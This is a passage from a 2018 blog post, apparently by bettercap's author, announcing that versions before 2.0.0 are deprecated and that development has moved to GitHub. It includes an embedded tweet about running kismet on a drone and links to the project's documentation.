class=\"twitter-tweet\" data-lang=\"en\"\u003e\u003cp lang=\"en\" dir=\"ltr\"\u003eThere\u0026#39;s power on that USB ... kismet on a drone ftw \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://t.co/CbeeyL0QtZ\"\u003epic.twitter.com/CbeeyL0QtZ\u003c/a\u003e\u003c/p\u003e— 🦄 (@evilsocket) \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://twitter.com/evilsocket/status/941320272728264705?ref_src=twsrc%5Etfw\"\u003eDecember 14, 2017\u003c/a\u003e\u003c/blockquote\u003e\n\u003cscript data-cfasync=\"false\" src=\"/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js\"\u003e\u003c/script\u003e\u003cscript async=\"\" src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"\u003e\u003c/script\u003e\n\u003c/center\u003e\n\u003cp\u003eI’m so looking forward to see what users will create with this API, \u003cstrong\u003eno more ugly Python wrappers\u003c/strong\u003e, \u003cstrong\u003eno more parsing complicated log files\u003c/strong\u003e! F YEAH!!!\u003c/p\u003e\n\u003cp\u003eWell, that’s it … everything \u0026lt; 2.0.0 is deprecated and not supported anymore, developement \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/bettercap\"\u003emoved here\u003c/a\u003e and there’s a \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/bettercap/bettercap/wiki\"\u003epretty decent documentation\u003c/a\u003e that’ll help you getting started … as usual, \u003cstrong\u003eenjoy\u003c/strong\u003e :)\u003c/p\u003e\n\u003cimg src=\"https://abs.twimg.com/emoji/v2/72x72/1f984.png\"/\u003e\n\u003c/div\u003e",
  "Date": "2018-02-27T19:37:20Z",
  "Author": "Simone Margaritelli"
}